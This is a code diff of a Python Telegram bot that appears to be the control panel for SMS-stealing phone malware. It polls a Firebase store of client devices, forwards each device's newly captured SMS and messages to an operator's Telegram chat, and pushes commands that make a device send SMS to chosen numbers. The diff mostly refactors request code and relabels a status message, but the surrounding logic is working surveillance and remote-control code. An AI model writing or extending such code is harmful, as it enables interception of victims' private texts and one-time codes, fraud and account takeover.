@@ -187,28 +187,24 @@ async def monitor_task(chat_id, context):
     last_sms_key = None
     last_msg_key = None
     
+    # Init: Pehle last key note karo taaki purana data na aaye
     try:
-        sms_url = f"{firebase_base}/{selected_device_id}/sms.json"
-        sms_data = requests.get(sms_url).json()
+        sms_data = requests.get(f"{firebase_base}/{selected_device_id}/sms.json").json()
         if sms_data: last_sms_key = list(sms_data.keys())[-1]
-        
-        msg_url = f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json"
-        msg_data = requests.get(msg_url).json()
+        msg_data = requests.get(f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json").json()
         if msg_data: last_msg_key = list(msg_data.keys())[-1]
     except: pass
     
     while is_monitoring:
         try:
-            sms_url = f"{firebase_base}/{selected_device_id}/sms.json"
-            sms_data = requests.get(sms_url).json()
+            sms_data = requests.get(f"{firebase_base}/{selected_device_id}/sms.json").json()
             if sms_data and isinstance(sms_data, dict):
                 keys = list(sms_data.keys())
                 if keys[-1] != last_sms_key:
                     last_sms_key = keys[-1]
                     await context.bot.send_message(chat_id=chat_id, text=f"📱 New SMS:\n{sms_data[last_sms_key]}")
             
-            msg_url = f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json"
-            msg_data = requests.get(msg_url).json()
+            msg_data = requests.get(f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json").json()
             if msg_data and isinstance(msg_data, dict):
                 keys = list(msg_data.keys())
                 if keys[-1] != last_msg_key:
@@ -243,7 +239,7 @@ async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 push_url = f"{firebase_base}/{selected_device_id}/webhookEvent/sendSms.json"
                 response = requests.put(push_url, json=payload)
                 if response.status_code == 200:
-                    await update.effective_chat.send_message(f"✅ SMS Sent to Webhook!\n🎯 To: {target_number}")
+                    await update.effective_chat.send_message(f"✅ SMS Sent to Connection Device!\n🎯 To: {target_number}")
                 else:
                     await update.effective_chat.send_message(f"❌ Firebase Error: {response.status_code}")
             else:
@@ -264,3 +260,4 @@ if __name__ == '__main__':
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.ChatType.CHANNEL, forward_messages))
     app.run_polling()
+        
